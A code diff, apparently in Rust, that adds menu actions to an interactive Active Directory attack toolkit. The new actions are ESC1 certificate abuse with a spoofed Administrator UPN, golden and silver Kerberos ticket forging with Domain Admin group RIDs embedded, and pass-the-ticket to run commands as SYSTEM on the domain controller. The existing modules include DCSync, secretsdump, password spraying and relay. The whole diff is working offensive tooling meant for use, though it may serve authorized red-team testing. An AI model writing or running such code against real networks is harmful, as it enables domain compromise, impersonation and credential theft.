@@ -6,10 +6,14 @@ use dialoguer::{Confirm, Input, Password, Select};
 
 use crate::session::{self, Session};
 use crate::{
-    abuse, coerce, dcsync, exec_cmd, gmsa, lsa, netenum, poison, rbcd, relay, roast, samr, scan,
-    secretsdump, spray, AbuseArgs, CoerceArgs, DcsyncArgs, ExecArgs, GmsaArgs, LsaArgs, NetArgs,
-    RbcdArgs, RelayArgs, SamrArgs, SecretsdumpArgs, SprayArgs,
+    abuse, asktgt, coerce, dcsync, esc1, exec_cmd, gmsa, golden, lsa, netenum, poison, pth, rbcd,
+    relay, roast, samr, scan, secretsdump, silver, spray, AbuseArgs, AsktgtArgs, CoerceArgs,
+    DcsyncArgs, Esc1Args, ExecArgs, GmsaArgs, GoldenArgs, LsaArgs, NetArgs, PthArgs, RbcdArgs,
+    RelayArgs, SamrArgs, SecretsdumpArgs, SilverArgs, SprayArgs,
 };
+
+/// Default Domain-Admin group RID set embedded in forged tickets.
+const DA_GROUPS: &[u32] = &[513, 512, 520, 518, 519];
 
 enum Action {
     Scan,
@@ -28,6 +32,11 @@ enum Action {
     Exec,
     Secretsdump,
     Gmsa,
+    Esc1,
+    Asktgt,
+    Golden,
+    Silver,
+    Pth,
     ShowRoadmap,
     Exit,
 }
@@ -55,6 +64,17 @@ const MENU: &[(&str, Action)] = &[
         Action::Secretsdump,
     ),
     ("gMSA — read managed password → NT hash", Action::Gmsa),
+    ("ESC1 — AD CS cert enroll (spoofed UPN SAN)", Action::Esc1),
+    ("AskTGT — password → Kerberos ccache", Action::Asktgt),
+    ("Golden — forge a TGT (krbtgt key)", Action::Golden),
+    (
+        "Silver — forge a service ticket (service key)",
+        Action::Silver,
+    ),
+    (
+        "Pass-the-ticket — forge → Kerberos SMB → run as SYSTEM",
+        Action::Pth,
+    ),
     (
         "Show open vectors (VECTORS.md summary)",
         Action::ShowRoadmap,
@@ -415,8 +435,182 @@ async fn dispatch(action: &Action, s: &Session) -> Result<()> {
             })
             .await
         }
+        Action::Esc1 => {
+            let ca: String = Input::new()
+                .with_prompt("CA name (e.g. corp-CA)")
+                .interact_text()?;
+            let template: String = Input::new()
+                .with_prompt("Template")
+                .with_initial_text("User")
+                .interact_text()?;
+            let upn: String = Input::new()
+                .with_prompt("UPN to impersonate via SAN")
+                .with_initial_text(format!("Administrator@{}", s.domain))
+                .interact_text()?;
+            let pkinit = Confirm::new()
+                .with_prompt("Chain enroll → cert → PKINIT (TGT)?")
+                .default(false)
+                .interact()?;
+            esc1(Esc1Args {
+                host: s.dc.clone(),
+                domain: s.netbios(),
+                user: s.username.clone(),
+                password: s.password.clone(),
+                ca,
+                template,
+                upn,
+                out: std::env::temp_dir()
+                    .join("adh_esc1.crt")
+                    .to_string_lossy()
+                    .into_owned(),
+                pkinit,
+                kdc: Some(s.dc.clone()),
+            })
+            .await
+        }
+        Action::Asktgt => {
+            let out: String = Input::new()
+                .with_prompt("ccache output path")
+                .with_initial_text(format!("{}.ccache", s.username))
+                .interact_text()?;
+            asktgt(AsktgtArgs {
+                user: s.username.clone(),
+                realm: s.realm(),
+                kdc: s.dc.clone(),
+                password: s.password.clone(),
+                out: Some(out),
+            })
+            .await
+        }
+        Action::Golden => {
+            let krbtgt_aes256 = prompt_key("krbtgt AES256 key (64 hex, from DCSync krbtgt)")?;
+            let domain_sid = prompt_sid()?;
+            let (user, rid) = prompt_impersonation()?;
+            let verify_spn: String = Input::new()
+                .with_prompt("Verify against SPN (empty = skip KDC check)")
+                .with_initial_text(format!("cifs/{}", s.dc))
+                .allow_empty(true)
+                .interact_text()?;
+            let out: String = Input::new()
+                .with_prompt("ccache output path (empty = don't save)")
+                .allow_empty(true)
+                .interact_text()?;
+            golden(GoldenArgs {
+                kdc: s.dc.clone(),
+                realm: s.realm(),
+                krbtgt_aes256,
+                domain_sid,
+                user,
+                rid,
+                groups: DA_GROUPS.to_vec(),
+                out: (!out.is_empty()).then_some(out),
+                verify_spn: (!verify_spn.is_empty()).then_some(verify_spn),
+            })
+            .await
+        }
+        Action::Silver => {
+            let service_aes256 = prompt_key("service account AES256 key (64 hex, from DCSync)")?;
+            let spn: String = Input::new()
+                .with_prompt("Target SPN (e.g. cifs/dc.corp.local)")
+                .with_initial_text(format!("cifs/{}", s.dc))
+                .interact_text()?;
+            let domain_sid = prompt_sid()?;
+            let (user, rid) = prompt_impersonation()?;
+            let out: String = Input::new()
+                .with_prompt("ccache output path (empty = don't save)")
+                .allow_empty(true)
+                .interact_text()?;
+            silver(SilverArgs {
+                realm: s.realm(),
+                service_aes256,
+                spn,
+                domain_sid,
+                user,
+                rid,
+                groups: DA_GROUPS.to_vec(),
+                out: (!out.is_empty()).then_some(out),
+            })
+            .await
+        }
+        Action::Pth => {
+            let golden_mode = Select::new()
+                .with_prompt("Ticket type")
+                .items(&[
+                    "Golden (krbtgt key, via KDC)",
+                    "Silver (service key, no KDC)",
+                ])
+                .default(0)
+                .interact()?
+                == 0;
+            let (krbtgt_aes256, service_aes256) = if golden_mode {
+                (Some(prompt_key("krbtgt AES256 key (64 hex)")?), None)
+            } else {
+                (
+                    None,
+                    Some(prompt_key("service account AES256 key (64 hex)")?),
+                )
+            };
+            let domain_sid = prompt_sid()?;
+            let (user, rid) = prompt_impersonation()?;
+            let spn: String = Input::new()
+                .with_prompt("Target SPN")
+                .with_initial_text(format!("cifs/{}", s.dc))
+                .interact_text()?;
+            let command: String = Input::new()
+                .with_prompt("Command to run (empty = just prove access)")
+                .with_initial_text("whoami")
+                .allow_empty(true)
+                .interact_text()?;
+            pth(PthArgs {
+                host: s.dc.clone(),
+                kdc: Some(s.dc.clone()),
+                realm: s.realm(),
+                domain_sid,
+                krbtgt_aes256,
+                service_aes256,
+                spn: Some(spn),
+                user,
+                rid,
+                groups: DA_GROUPS.to_vec(),
+                command: (!command.is_empty()).then_some(command),
+            })
+            .await
+        }
         Action::ShowRoadmap | Action::Exit => Ok(()),
     }
+}
+
+/// Prompt for a 64-hex AES256 key, trimming/validating length.
+fn prompt_key(label: &str) -> Result<String> {
+    let k: String = Input::new().with_prompt(label).interact_text()?;
+    let k = k.trim().to_string();
+    anyhow::ensure!(
+        k.len() == 64,
+        "expected a 64-hex AES256 key, got {} chars",
+        k.len()
+    );
+    Ok(k)
+}
+
+fn prompt_sid() -> Result<String> {
+    Ok(Input::<String>::new()
+        .with_prompt("Domain SID (S-1-5-21-a-b-c)")
+        .interact_text()?
+        .trim()
+        .to_string())
+}
+
+/// Impersonation identity: user + RID (defaults to Administrator / 500).
+fn prompt_impersonation() -> Result<(String, u32)> {
+    let user: String = Input::new()
+        .with_prompt("Impersonate user")
+        .with_initial_text("Administrator")
+        .interact_text()?;
+    let rid: u32 = Input::new()
+        .with_prompt("RID")
+        .with_initial_text("500")
+        .interact_text()?;
+    Ok((user, rid))
 }
 
 fn print_roadmap_summary() {
